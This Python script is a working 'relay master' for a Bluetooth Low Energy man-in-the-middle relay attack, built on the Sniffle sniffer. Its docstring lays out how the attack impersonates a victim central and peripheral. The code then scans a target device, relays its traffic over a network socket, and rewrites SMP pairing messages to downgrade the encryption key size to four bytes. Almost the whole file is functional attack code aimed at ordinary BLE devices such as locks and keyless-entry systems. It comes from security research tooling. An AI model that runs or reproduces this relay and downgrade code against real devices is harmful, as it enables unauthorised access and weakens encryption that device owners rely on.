#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020-2025, NCC Group plc
# Copyright (c) 2025, Tetrel Security Inc.
# Released as open source under GPLv3

import argparse, sys, signal
import serial
from binascii import unhexlify
from queue import Queue
from time import time
from select import select
from struct import pack, unpack

from sniffle.pcap import PcapBleWriter
from sniffle.sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, \
        StateMessage, MeasurementMessage, SnifferState, SnifferMode
from sniffle.packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, \
        AdvIndMessage, AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, \
        str_mac, LlControlMessage, AdvertMessage
from sniffle.relay_protocol import RelayServer, MessageType, ErrorCode

from mitble_help import downgrade_pairing_request, downgrade_pairing_response

"""
Relay attack principles:

C refers to the real central (initiator/master)
P refers to the real peripheral (advertiseer/slave)
C_r refers to relay_master.py (relay impersonating central)
P_r refers to relay_slave.py (relay impersonating peripheral)

Relay master script also has a network listener, relay slave connects to it.

First, the relay master (C_r) gathers the adverisement body and scan response
from the victim peripheral (P). Next, the advertisement data is passed onto
the relay slave (P_r) to mimic the victim peripheral. Once the victim
central (C) connects to the relay slave (P_r) mimicking the victim peripheral,
the relay slave will inform the relay master, so that it can start its own
connection to the real victim peripheral with potentially different parameters.

C               P_r             C_r             P
                                <----------Advert
                                ScanReq--------->
                                <---------ScanRsp
                <---------Advert
                <--------ScanRsp
<---------Advert
ScanReq-------->
<--------ScanRsp
ConnReq-------->
(I starts channel hopping with P_r)
                ConnReq-------->
                                (wait for next advert)
                                <----------Advert
                                ConnReq--------->

Once connected, data can be encrypted, but we don't care, we just pass it on.
One limitation is that encrypted LL_CONTROL messages could change hopping
parameters, but we can't decipher them. It may be possible to make an educated
guess of what the control messages are though based on past behaviour.

C               P_r             C_r             P
Encrypted------>
<----------Empty
                Encrypted----->
                                Encrypted------>
                                <--------EncResp
                <--------EncResp
(wait for next conn event)
Empty--------->
<-------EncResp
"""

# global variable to access hardware
hw = None

# global variable for pcap writer
pcwriter = None


def sigint_handler(sig, frame):
    hw.cancel_recv()
    hw.cmd_chan_aa_phy() # stop scanning or connection
    hw.cmd_rssi(0)
    sys.exit(0)

def main():
    aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default=None, help="Sniffer serial port name")
    aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
            help="Advertising channel to listen on")
    aparse.add_argument("-m", "--mac", default=None, help="Specify target MAC address")
    aparse.add_argument("-i", "--irk", default=None, help="Specify target IRK")
    aparse.add_argument("-S", "--string", default=None,
            help="Specify target by advertisement search string")
    aparse.add_argument("-P", "--public", action="store_const", default=False, const=True,
            help="Supplied MAC address is public")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    aparse.add_argument("-Q", "--preload", default=None, help="Preload expected encrypted "
            "connection parameter changes")
    aparse.add_argument("-f", "--fastslave", action="store_const", default=False, const=True,
            help="Relay slave should request a fast connection interval")
    aparse.add_argument("-p", "--pause", action="store_const", default=False, const=True,
            help="Wait for key press on master before relaying")
    aparse.add_argument("-F", "--fastmaster", action="store_const", default=False, const=True,
            help="Relay master should specify a fast connection interval")
    aparse.add_argument("-o", "--output", default=None, help="PCAP output file name")
    aparse.add_argument("--periph-serial", default=None,
        help="Serial port of the REAL peripheral (e.g. COM7 or /dev/ttyACM0)")
    aparse.add_argument("--periph-baud", type=int, default=115200,
        help="Baudrate for the REAL peripheral (default: 115200)")
    args = aparse.parse_args()
    global hw
    hw = SniffleHW(args.serport)
    new_key_size = 0x04


    # put the hardware in a normal state (passive scanning) and configure it with an impossibly
    # high RSSI threshold so that it captures nothing (to avoid filling receive buffers)
    hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)

    # trap Ctrl-C
    signal.signal(signal.SIGINT, sigint_handler)

    targ_specs = bool(args.mac) + bool(args.irk) + bool(args.string)
    if targ_specs < 1:
        print("Must specify target MAC address, IRK, or advertisement string", file=sys.stderr)
        return
    elif targ_specs > 1:
        print("IRK, MAC, and advertisement string filters are mutually exclusive!", file=sys.stderr)
        return

    if args.public and args.irk:
        print("IRK only works on RPAs, not public addresses!", file=sys.stderr)
        return
    elif args.public and args.string:
        print("Can't specify string search target MAC publicness", file=sys.stderr)
        return

    # wait for relay slave to connect to us
    server = RelayServer()
    print("Waiting for relay slave to connect...")
    conn = server.accept()
    print("Got connection from", conn.peer_ip)

    
    # Network latency test
    stime = time()
    conn.send_msg(MessageType.PING, b'latency_test')
    mtype, body = conn.recv_msg()
    etime = time()
    if mtype != MessageType.PING or body != b'latency_test':
        raise ValueError("Unexpected message type in latency test")
    print("Round trip latency: %.1f ms" % ((etime - stime) * 1000))

    # give the relay slave the preloads if any
    if args.preload:
        conn.send_msg(MessageType.PRELOAD, bytes(args.preload, encoding='utf-8'))
    else:
        conn.send_msg(MessageType.PRELOAD, b'')

    if args.irk:
        mac_bytes = get_mac_from_irk(unhexlify(args.irk), args.advchan)
    elif args.string:
        search_str = args.string.encode('latin-1').decode('unicode_escape').encode('latin-1')
        mac_bytes, args.public = get_mac_from_string(search_str, args.advchan)
    else:
        try:
            mac_bytes = [int(h, 16) for h in reversed(args.mac.split(":"))]
            if len(mac_bytes) != 6:
                raise Exception("Wrong length!")
        except:
            print("MAC must be 6 colon-separated hex bytes", file=sys.stderr)
            return

    # obtain the target's advertisement and scan response, share it with relay slave
    adv, scan_rsp = scan_target(mac_bytes)
    if not adv or not scan_rsp:
        print("Error: Advertisement type must be ADV_IND. Aborting.")
        conn.send_err(ErrorCode.INVALID_ADV)
        return
    conn.send_msg(MessageType.ADVERT, adv.body)
    conn.send_msg(MessageType.SCAN_RSP, scan_rsp.body)

    # put the hardware in a state where it won't capture any packets to avoid filling receive
    # buffer while waiting for connection from relay slave
    hw.setup_sniffer(mode=SnifferMode.PASSIVE_SCAN, rssi_min=0)

    if args.periph_serial:
        try:
            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
                ser.write(b'0')
            print(f"[UART->PERIPH] Sent '0' to {args.periph_serial} (pause advertising).")
        except Exception as e:
            print(f"[UART->PERIPH] WARNING: could not send '0' on {args.periph_serial}: {e}", file=sys.stderr)

    if args.pause:
        input("Press enter to continue...")
    conn.send_msg(MessageType.PING, b'')

    # relay slave will now impersonate our target

    # wait for relay slave to say who connected to it
    print("Waiting for relay slave to notify us of connection...")
    mtype, body = conn.recv_msg()
    if mtype != MessageType.CONN_REQ:
        raise ValueError("Unexpected message type %s" % mtype.name)
    conn_req = DPacketMessage.from_body(body)
    if not isinstance(conn_req, ConnectIndMessage):
        raise ValueError("CONN_REQ was not a CONN_REQ!")

    if args.periph_serial:
        try:
            with serial.Serial(args.periph_serial, args.periph_baud, timeout=0.5) as ser:
                ser.write(b'1')
            print(f"[UART->PERIPH] Sent '1' to {args.periph_serial} (resume advertising).")
        except Exception as e:
            print(f"[UART->PERIPH] WARNING: could not send '1' on {args.periph_serial}: {e}", file=sys.stderr)

    print("Relay slave notified us of connection request. Connecting to real target...")
    print(conn_req)
    # Receiver = real central C (checks peripheral peer on the C<->P_r link)
    global pcwriter
    if not (args.output is None):
        pcwriter = PcapBleWriter(args.output)

        pcwriter.write_packet(int(adv.ts_epoch * 1000000), adv.aa, adv.chan,
                adv.rssi, adv.body, adv.phy)
        pcwriter.write_packet(int(scan_rsp.ts_epoch * 1000000), scan_rsp.aa,
                scan_rsp.chan, scan_rsp.rssi, scan_rsp.body, scan_rsp.phy)
        print('channel: ', conn_req.chan)
        pcwriter.write_packet(int(time() * 1000000), conn_req.aa, conn_req.chan,
                conn_req.rssi, conn_req.body, conn_req.phy)

    connector_addr = conn_req.InitA
    connector_random = bool(conn_req.TxAdd)
    if args.fastmaster:
        connector_interval = 6
        connector_latency = 0
    else:
        connector_interval = conn_req.Interval
        connector_latency = conn_req.Latency

    preloads = []
    if args.preload:
        # expect colon separated pairs, separated by commas
        preloads = []
        for tstr in args.preload.split(','):
            tsplit = tstr.split(':')
            tup = (int(tsplit[0]), int(tsplit[1]))
            preloads.append(tup)

    #input("Press Enter to initiate (send CONNECT_IND on next advert)...")
    #print('Send connection request...')
    # connect to real target, impersonating who connected to relay slave
    connect_target(mac_bytes, args.advchan, not args.public, connector_addr,
            connector_random, connector_interval, connector_latency, preloads)
  #  print('Send connection request 1 sent')
    # wait for transition to master state
    while True:
        msg = hw.recv_and_decode()
        print(msg)
        if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
            print("Inside if")
            hw.decoder_state.cur_aa = conn_req.aa_conn
            break
    print("Connected to target.", end='\n\n')

    # request legitimate master (relay slave) to use a fast connection interval
    # LL Control (0x03), length 24 (0x18), LL_CONNECTION_PARAM_REQ (0x0F)
    # interval: 0x0006 to 0x000A (7.5 to 15 ms)
    # latency: 0
    # timeout: 0x01F4 (5 seconds)
    # preferred periodicity: 3
    # reference event: 0x0005
    # offsets: 0x0001, 0x0002, 0x0003, 0x0004, 0x0005, 0x0000
    if args.fastslave:
        conn_update_pdu = DPacketMessage.from_body(b'\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03'
                b'\x05\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x00\x00')
        conn.send_msg(MessageType.PACKET, b'\x04\x00' + conn_update_pdu.body)

    filter_changes = args.fastslave or args.fastmaster

    while True:
        ready, _, _ = select([hw.ser.fd, conn.sock], [], [])

        if conn.sock in ready:
            sock_recv_print_forward(conn, args.quiet, new_key_size, filter_changes)
        if hw.ser.fd in ready:
            ser_recv_print_forward(conn, args.quiet,new_key_size, filter_changes)

def has_instant(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]

def is_param_req(pkt):
    return isinstance(pkt, LlControlMessage) and pkt.opcode == 0x0F

def _hex_bytes(b: bytes) -> str:
    return " ".join(f"{x:02x}" for x in b)

def _hx(b: bytes) -> str:
    return ''.join(f'{x:02x}' for x in b)

def _extract_smp_key_size_from_ll_body(ll_body: bytes):
    """
    Returns (smp_code, key_size) if this LL body contains an SMP Pairing Req/Rsp,
    else returns (None, None). Safe to call on any LL body.
    """
    if len(ll_body) < 4:
        return (None, None)
    llid = ll_body[0] & 0x03
    length = ll_body[1]
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return (None, None)
    l2cap = ll_body[2:2+length]
    if len(l2cap) < 7:
        return (None, None)
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)
    if cid != 0x0006 or len(l2cap) < 4 + l2len or l2len < 7:
        return (None, None)
    smp = l2cap[4:4+l2len]
    smp_code = smp[0]
    if smp_code not in (0x01, 0x02):  # Pairing Request / Response
        return (None, None)
    return (smp_code, smp[4])


def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
    # receive packets from relay slave and retransmit them here
    mtype, body = conn.recv_msg()
    if mtype != MessageType.PACKET:
        return

    # Keep a copy of the original [event_le16][LL body ...]
    old_packet = body

    # Downgrade entropy if this is an SMP Pairing Response coming from the relay slave
    new_packet, changed = downgrade_pairing_response(body, new_key_size)
    body = new_packet
    if changed:
        # Compare LL bodies (skip the 2-byte event header)
        old_ll = old_packet[2:]
        new_ll = new_packet[2:]

        old_code, old_ks = _extract_smp_key_size_from_ll_body(old_ll)
        new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
        code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")

        # Guard against any unexpected None values (shouldn't happen if changed=True)
        if old_ks is None or new_ks is None:
            print("[DOWNGRADE] SMP key size changed (peripheral -> master).")
        else:
            print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
        print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
        print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")

    # Unpack event and proceed as before
    event, = unpack('<H', body[:2])
    body = body[2:]
    llid = body[0] & 3
    pdu = body[2:]
    # construct packet object for display and PCAP
    pkt = DPacketMessage.from_body(body, True)
    pkt.ts_epoch = time()
    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
    pkt.aa = hw.decoder_state.cur_aa
    pkt.event = event

    # Passing on PDUs with instants in the past would break the connection
    if not (filter_changes and has_instant(pkt)):
        hw.cmd_transmit(llid, pdu, event)
    print_message(pkt, quiet)


def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
    msg = hw.recv_and_decode()

    if isinstance(msg, PacketMessage):
        msg = DPacketMessage.decode(msg)
        # only forward non-empty data
        empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
        block_req = filter_changes and is_param_req(msg)

        # Try to downgrade entropy on outgoing DataMessage LL bodies
        if not empty and not block_req and isinstance(msg, DataMessage):
            old_body = msg.body
            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
            if changed:
                # Best-effort: print SMP code and key sizes before/after
                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
                # Human-friendly name
                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
                msg.body = new_ll
                # Also rewrite SMP Confirm/Random in periph->central direction
        if block_req:
            # LL_REJECT_EXT_IND, unacceptable connection parameters
            hw.cmd_transmit(3, b'\x11\x0F\x3B')

    print_message(msg, quiet)

def print_message(msg, quiet=False):
    if isinstance(msg, DPacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage) or \
            isinstance(msg, StateMessage) or \
            isinstance(msg, MeasurementMessage):
        print(msg, end='\n\n')

def get_mac_from_irk(irk, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_irk(irk, False)
    hw.cmd_auxadv(False)
    hw.mark_and_flush()

    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            print("Found target MAC: %s" % str_mac(dpkt.AdvA))
            return dpkt.AdvA

def get_mac_from_string(s, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_mac()
    hw.cmd_auxadv(False)
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    print("Waiting for advertisement containing specified string...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, (AdvIndMessage, AdvDirectIndMessage, ScanRspMessage)):
            if s in dpkt.body:
                print("Found target MAC: %s" % str_mac(dpkt.AdvA))
                return dpkt.AdvA, not dpkt.TxAdd

def scan_target(mac):
    advPkt = None
    scanRspPkt = None

    hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(mac, False)
    hw.cmd_auxadv(False) # we only support impersonating legacy advertisers for now
    hw.random_addr()
    hw.cmd_scan()
    hw.mark_and_flush()

    while (advPkt is None) or (scanRspPkt is None):
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage):
            if advPkt is None:
                print("Found advertisement.")
            advPkt = dpkt
        elif isinstance(dpkt, ScanRspMessage):
            if scanRspPkt is None:
                print("Found scan response.")
            scanRspPkt = dpkt
        elif isinstance(dpkt, AdvertMessage):
            print("Received incompatible advertisement of type %s." % dpkt.pdutype)
            return None, None

    print("Target Advertisement:")
    print(advPkt)
    print()
    print("Target Scan Response:")
    print(scanRspPkt)
    print()

    return advPkt, scanRspPkt

def connect_target(targ_mac, chan=37, targ_random=True, initiator_mac=None, initiator_random=True,
        interval=24, latency=1, preloads=[]):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(targ_mac, False)
    hw.cmd_auxadv(False)
    hw.cmd_interval_preload(preloads)
    hw.cmd_phy_preload()
    if initiator_mac is None:
        hw.random_addr()
    else:
        hw.cmd_setaddr(initiator_mac, initiator_random)
    hw.mark_and_flush()

    # now enter initiator mode
    return hw.initiate_conn(targ_mac, targ_random, interval, latency)

def print_packet(pkt, quiet=False):
    is_not_empty = not (isinstance(pkt, LlDataContMessage) and pkt.data_length == 0)

    if not quiet or is_not_empty:
        print(pkt, end='\n\n')

    # Record the packet if PCAP writing is enabled
    if pcwriter and is_not_empty:
        if isinstance(pkt, DataMessage):
            pdu_type = 3 if pkt.data_dir else 2
        else:
            pdu_type = 0
        pcwriter.write_packet(int(pkt.ts_epoch * 1000000), pkt.aa, pkt.chan, pkt.rssi,
                pkt.body, pkt.phy, pdu_type)

if __name__ == "__main__":
    main()
